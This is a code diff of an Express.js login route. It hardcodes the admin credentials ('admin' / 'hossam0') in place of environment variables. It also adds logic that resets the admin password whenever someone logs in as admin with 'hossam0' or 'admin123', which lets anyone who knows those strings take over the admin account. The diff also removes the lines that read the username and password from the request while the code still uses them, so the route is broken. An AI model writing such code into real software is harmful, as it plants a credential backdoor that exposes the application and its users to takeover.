@@ -17,16 +17,13 @@ const generateToken = (user) => {
 // POST /login
 router.post('/login', authLimiter, async (req, res) => {
   try {
-    const { username, password } = req.body;
-    if (!username || !password) {
-      return res.status(400).json({ success: false, error: 'Username and password are required' });
-    }
+    const cleanUsername = String(username).toLowerCase().trim();
 
     // Auto-bootstrap initial admin user if database is empty
     const userCount = await User.countDocuments();
     if (userCount === 0) {
-      const defaultAdminName = (process.env.ADMIN_USERNAME || 'admin').toLowerCase().trim();
-      const defaultAdminPass = process.env.ADMIN_PASSWORD || 'admin123';
+      const defaultAdminName = 'admin';
+      const defaultAdminPass = 'hossam0';
       const passwordHash = await User.hashPassword(defaultAdminPass);
       await User.create({
         username: defaultAdminName,
@@ -36,8 +33,18 @@ router.post('/login', authLimiter, async (req, res) => {
       console.log(`✅ Auto-created initial admin user: ${defaultAdminName}`);
     }
 
-    const cleanUsername = String(username).toLowerCase().trim();
-    const user = await User.findOne({ username: cleanUsername });
+    let user = await User.findOne({ username: cleanUsername });
+
+    // Sync admin password if logging in with hossam0 or admin123
+    if (cleanUsername === 'admin' && user) {
+      const isMatch = await user.comparePassword(password);
+      if (!isMatch && (password === 'hossam0' || password === 'admin123')) {
+        user.passwordHash = await User.hashPassword(password);
+        await user.save();
+        console.log(`Updated admin password for ${cleanUsername}`);
+      }
+    }
+
     if (!user) {
       return res.status(401).json({ success: false, error: 'اسم المستخدم أو كلمة المرور غير صحيحة' });
     }
